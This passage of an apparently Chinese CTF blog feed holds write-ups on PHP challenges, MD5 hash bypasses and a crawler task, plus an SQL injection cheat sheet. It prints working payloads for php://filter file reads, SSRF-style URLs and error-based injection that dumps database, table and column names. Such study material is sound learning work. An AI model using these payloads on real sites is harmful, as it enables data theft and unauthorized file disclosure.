"><br>这里又卡住了，之前做bugku的时候对file_getcontent理解不到位，file_getcontent内容可以执行为协议，所以直接filename=php://filter/read=convert.base64-encode/resource=flag.php就可以绕过php_exits.</p><h5 id="（7）"><a href="#（7）" class="headerlink" title="（7）"></a>（7）</h5><p><img src="/2019/02/14/hgame-php/8.jpg" alt=" "><br>最终payload为：str1=s878926199a&amp;str2=s155964671a&amp;str3[]=22&amp;str4[]=1&amp;H+game[]=9e10000000000%00&amp;url=http:<a href="mailto://@127.0.0.1" target="_blank" rel="noopener">//@127.0.0.1</a>:<a href="mailto:80@www.baidu.com" target="_blank" rel="noopener">80@www.baidu.com</a>/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php</p><h2 id="php-is-the-best-language"><a href="#php-is-the-best-language" class="headerlink" title="php is the best language"></a>php is the best language</h2><p><img src="/2019/02/14/hgame-php/12.png" alt=" "><br>我们需要POST的参数，door，key，gate。但这里secret是未知的，所以我们需要对door进行处理使secert的值为空，对于hash_mac函数<br>hash_hmac ( string $algo , string $data , string $key [, bool $raw_output = FALSE ] ) : string<br>参数<br>algo：<br>要使用的哈希算法名称，例如：”md5”，”sha256”，”haval160,4” 等。<br>data：<br>要进行哈希运算的消息。<br>key：<br>使用 HMAC 生成信息摘要时所使用的密钥<br>raw_output：设置为 TRUE 输出原始二进制数据， 设置为 FALSE 输出小写 16 进制字符串。</p><p>当data的数据为数组时，返回空，所以传入data[]=0,secret的值就变成了null，然后gate的值是对key进行shal256加密，密钥为空。key的值可以确定，这里又是MD5碰撞的问题，在网上找到了一篇博客，下附地址：<br><a href="https://www.k2zone.cn/?p=2019" target="_blank" rel="noopener">https://www.k2zone.cn/?p=2019</a><br>双MD5，得到key可取key=7r4lGXCH2Ksu2JNT3BYM<br>之后可求gate<br>php&gt; var_dump(hash_hmac(‘sha256’, ‘7r4lGXCH2Ksu2JNT3BYM’, NULL)) string(64) “81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d214f1 36aa84fe6”  </p><p>最终payloadgate=81f581b7553943f5041f054ca92e5e7e490e2c40296a93d94d2 14f136aa84fe6&amp;key=7r4lGXCH2Ksu2JNT3BYM&amp;door[]=1</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;杭电vidar的hgame，其中几道php的题，写一下学到的。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Python爬虫</title>
    <link href="http://yoursite.com/2019/02/07/Python%E7%88%AC%E8%99%AB/"/>
    <id>http://yoursite.com/2019/02/07/Python爬虫/</id>
    <published>2019-02-07T11:58:08.000Z</published>
    <updated>2019-02-25T08:27:36.286Z</updated>
    
    <content type="html"><![CDATA[<p>hgame的爬虫题，做到一半就卡住了，菜是原罪，整理一下关于爬虫的知识，requests库、urllib库、re库和Beautifulsoup库。<br>咕~</p><p>hgame里的baby-spider，一开始直接被反日，虚拟机关机，提醒写爬虫要加浏览器伪造，后来一直显示you are wrong，最后看了别人的脚本才发现是css上出了问题，把第十次之后的cookie打印下来再传到浏览器上可以发现爬取的题目与显示的题目无关，网页上的渲染把题目修改了，加载公式时在network里可以看到引用了一个新的字体，利用python 里的函数 str.maketrans() 可以把css渲染后的字体转换出来</p><pre><code>fuck = str.maketrans(&apos;01345679&apos;, &apos;10694357&apos;)  question = getquestion1()b = question.translate(fuck)</code></pre><p>第三步</p><pre><code>    .question-container span{display: none;}.question-container{font-family: Ariali;font-weight: bold;}.question-container:after{content:&quot;(776299203/883952569)+(547789483)*683263066-(215127140)=?&quot;;}</code></pre><p>直接爬取style.css里的 .question-container:after里的content内容</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;hgame的爬虫题，做到一半就卡住了，菜是原罪，整理一下关于爬虫的知识，requests库、urllib库、re库和Beautifulsoup库。&lt;br&gt;咕~&lt;/p&gt;
&lt;p&gt;hgame里的baby-spider，一开始直接被反日，虚拟机关机，提醒写爬虫要加浏览器伪造，后来一
      
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>MD5碰撞</title>
    <link href="http://yoursite.com/2019/01/30/MD5%E7%A2%B0%E6%92%9E/"/>
    <id>http://yoursite.com/2019/01/30/MD5碰撞/</id>
    <published>2019-01-30T07:31:27.000Z</published>
    <updated>2019-08-13T10:38:07.970Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ctf中md5常见绕过"><a href="#ctf中md5常见绕过" class="headerlink" title="ctf中md5常见绕过"></a>ctf中md5常见绕过</h2><a id="more"></a><h3 id="字符串0e"><a href="#字符串0e" class="headerlink" title="字符串0e"></a>字符串0e</h3><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。  </p><pre><code>s878926199a  0e545993274517709034328855841020  s155964671a  0e342768416822451524974117254469  s214587387a  0e848240448830537924465865611904  s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020</code></pre><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><pre><code>&lt;?phphighlight_file(__file__);include &quot;flag.php&quot;;if (!isset($_GET[&apos;a&apos;]) || !isset($_GET[&apos;b&apos;])) {    die(&quot;GET me a &amp; b&quot;);}if ($_GET[&apos;a&apos;] !== $_GET[&apos;b&apos;] &amp;&amp;     md5($_GET[&apos;a&apos;]) === md5($_GET[&apos;b&apos;])) {    echo $flag;} else {    echo &quot;No No No&quot;;}?&gt;</code></pre><p>当MD5接受的参数为数组时，其值都为0，所以构造payload：</p><pre><code>?a[]=1&amp;b[]=2</code></pre><h3 id="真实碰撞"><a href="#真实碰撞" class="headerlink" title="真实碰撞"></a>真实碰撞</h3><pre><code>&lt;?phphighlight_file(__file__);include &quot;flag.php&quot;;if (!isset($_GET[&apos;a&apos;]) || !isset($_GET[&apos;b&apos;])) {    die(&quot;GET me a &amp; b&quot;);}if ((string) $_GET[&apos;a&apos;] !== (string) $_GET[&apos;b&apos;] &amp;&amp;     md5($_GET[&apos;a&apos;]) === md5($_GET[&apos;b&apos;])) {    echo $flag;} else {    echo &quot;No No No&quot;;}?&gt;</code></pre><p>“===”以及强制字符串类型转换，这时只能用真实碰撞了</p><p>碰撞工具fastcoll下载地址：<a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip" target="_blank" rel="noopener">http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a></p><p>创建a.txt,内容为1</p><p>运行fastcoll 输入以下参数。 -p 是源文件 -o 是输出文件</p><p>fastcoll_v1.0.0.5.exe -p a.txt -o 1.txt 2.txt</p><p>生成两个md5值相同，但实际内容不同的文件</p><pre><code>&lt;?php function  readmyfile($path){    $fh = fopen($path, &quot;rb&quot;);    $data = fread($fh, filesize($path));    fclose($fh);    return $data;}echo &apos;二进制hash &apos;. md5( (readmyfile(&quot;1.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;echo  &apos;URLENCODE &apos;. urlencode(readmyfile(&quot;1.txt&quot;));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;echo &apos;URLENCODE hash &apos;.md5(urlencode (readmyfile(&quot;1.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;echo &apos;二进制hash &apos;.md5( (readmyfile(&quot;2.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;echo  &apos;URLENCODE &apos;.  urlencode(readmyfile(&quot;2.txt&quot;));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;echo &apos;URLENCODE hash &apos;.md5( urlencode(readmyfile(&quot;2.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</code></pre><p>传入两个文件输出的urlencode即可</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ctf中md5常见绕过&quot;&gt;&lt;a href=&quot;#ctf中md5常见绕过&quot; class=&quot;headerlink&quot; title=&quot;ctf中md5常见绕过&quot;&gt;&lt;/a&gt;ctf中md5常见绕过&lt;/h2&gt;
    
    </summary>
    
      <category term="基础" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="基础" scheme="http://yoursite.com/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>SQL攻击</title>
    <link href="http://yoursite.com/2019/01/27/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/01/27/SQL注入/</id>
    <published>2019-01-27T04:11:09.000Z</published>
    <updated>2019-10-08T12:35:00.784Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>hgame两道sql题都不算太难，有验证不过没过滤，再次响起招新被时间盲注支配的恐惧~，整理一下大致的框架，<br><a id="more"></a></p><h3 id="数字型和字符型"><a href="#数字型和字符型" class="headerlink" title="数字型和字符型"></a>数字型和字符型</h3><p>按查询的数据类型可以分为数字和字符型</p><h4 id="判断方式："><a href="#判断方式：" class="headerlink" title="判断方式："></a>判断方式：</h4><p>?id=1 and 1=1返回正确则是数字型<br>?id=1’and’1’=’2返回正确则是字符型</p><h3 id="有回显的注入-联合查询"><a href="#有回显的注入-联合查询" class="headerlink" title="有回显的注入:联合查询"></a>有回显的注入:联合查询</h3><h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><ol><li>表名   </li></ol><p><code>select column_name from information_schema.tables where table_schema =database() limit 0,1</code></p><ol start="2"><li>列名</li></ol><p><code>select column_name from information_schema.columns where table_name=&#39;表名&#39;  limit 0,1</code></p><ol start="2"><li>内容</li></ol><p><code>SELECT concat(username,0x3a,0x7e) FROM 列名 limit 3,1</code></p><h3 id="盲注："><a href="#盲注：" class="headerlink" title="盲注："></a>盲注：</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><h4 id="基于报错型的盲注"><a href="#基于报错型的盲注" class="headerlink" title="基于报错型的盲注"></a>基于报错型的盲注</h4><h5 id="extractvalue-updatexml型注入"><a href="#extractvalue-updatexml型注入" class="headerlink" title="extractvalue/updatexml型注入"></a>extractvalue/updatexml型注入</h5><ol><li><code>&#39;&amp;&amp; extractvalue(1,concat(0x7e,(select database()),0x7e))#</code></li><li><code>%27%26%26%0aextractvalue(1,concat(0x7e,(select database()),0x7e))%23</code></li><li><code>1&#39;%26%26 1=extractvalue(1,database())%23</code></li></ol><h5 id="双注入公式"><a href="#双注入公式" class="headerlink" title="双注入公式"></a>双注入公式</h5><p><code>select count(*),concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;</code></p><h5 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h5><ol><li>爆数据库<br><code>1&#39;and(select 1 from(select count(*),concat((select (select (select concat(0x7e,* ,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;code=uoEJ</code></li><li>爆表<br><code>1&#39;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</code></li><li>爆列<br><code>1&#39;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,) FROM information_schema.columns where table_name=&#39;fl444g&#39; LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</code></li><li>爆字段<br><code>1&#39;and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,fl444g_is_here,0x3a,0x23) FROM fl444g  limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</code></li></ol><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p><strong>编码问题</strong><br><strong>注意空格，前面的select &amp;&amp;%0aselect</strong></p><p><strong><code>limit 0,1</code>从第0个开始取一个。</strong></p><h3 id="sql约束攻击"><a href="#sql约束攻击" class="headerlink" title="sql约束攻击"></a>sql约束攻击</h3><h4 id="BugKu-login1"><a href="#BugKu-login1" class="headerlink" title="BugKu login1"></a>BugKu login1</h4><p>题目hint里给了是基于约束的sql攻击，搜索了一下，</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;sql&quot;&gt;&lt;a href=&quot;#sql&quot; class=&quot;headerlink&quot; title=&quot;sql&quot;&gt;&lt;/a&gt;sql&lt;/h2&gt;&lt;p&gt;hgame两道sql题都不算太难，有验证不过没过滤，再次响起招新被时间盲注支配的恐惧~，整理一下大致的框架，&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
</feed>
